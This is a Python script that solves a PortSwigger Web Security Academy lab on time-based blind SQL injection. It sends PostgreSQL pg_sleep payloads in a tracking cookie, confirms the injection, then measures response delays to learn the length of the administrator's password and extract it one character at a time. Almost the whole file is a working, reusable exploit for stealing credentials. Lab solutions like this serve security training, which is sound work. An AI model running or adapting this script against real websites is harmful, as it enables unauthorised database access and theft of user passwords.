#/usr/bin/python3

"""
The challenge:
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

Example usage:
python3 1-14-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"
"""

import requests, argparse, string

# parse command line arguments
parser = argparse.ArgumentParser(add_help=True, description='Example usage:\n $python3 1-14-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"')
parser.add_argument('-u', '--url', action='store', required=True, help='Enter the full url of the page', type=str)
parser.add_argument('-c', '--sessioncookie', action='store', required=True, help='Enter the session cookie value', type=str)
parser.add_argument('-i', '--trackingid', action='store', required=True, help='Enter the tracking ID cookie value', type=str)
args = parser.parse_args()
cookie = args.sessioncookie
id = args.trackingid
if str(args.url[-1]) == "/":
	host = args.url[:-1]
else:
	host = args.url


def testquery():
	#this one should cause a delay
	query = "'||pg_sleep(2)--"
	cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
	url = f"{host}/"
	r = requests.request("GET", url=url, cookies=cookies)
	rc = r.status_code
	rt = r.elapsed.total_seconds()
	return True if rt > 2 else False

def getresponselength():
	url = f"{host}/"
	for i in range (1, 100):
		query = f"'||(SELECT CASE WHEN LENGTH(password)={i} THEN pg_sleep(2) ELSE '' END FROM users WHERE username='administrator')||'--"
		cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
		r = requests.request("GET", url=url, cookies=cookies)
		rt = r.elapsed.total_seconds()
		if rt > 2:
			return i

def getresponse(lr):
	url = f"{host}/"
	response = ""
	for i in range(1, lr+1):
		for char in string.digits + string.ascii_letters:
			query = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN pg_sleep(2) ELSE '' END FROM users WHERE username='administrator')||'--"
			cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
			r = requests.request("GET", url=url, cookies=cookies)
			rt = r.elapsed.total_seconds()
			if rt > 2:
				response += char
				print(response)
	return response


#Lets gooo

# Test the validity of the sql query
if testquery() == False:
	print(f"\nDid not get the expected response codes. Maybe there is something wrong in the url or cookie parameters?")
	print(f"Here is the help menu:\n")
	parser.print_help()

else:
	print(" ~> looks like the injection works!")
	print(" ~> Length response: ")
	lr = getresponselength()
	print(" ~> " + str(lr) + "\n")
	print(" ~> herewego:")
	print(" ~> (this might take a while ..)\n")
	response = getresponse(lr)
	print("\n ~> Done! the result: ")
	print(str(response))
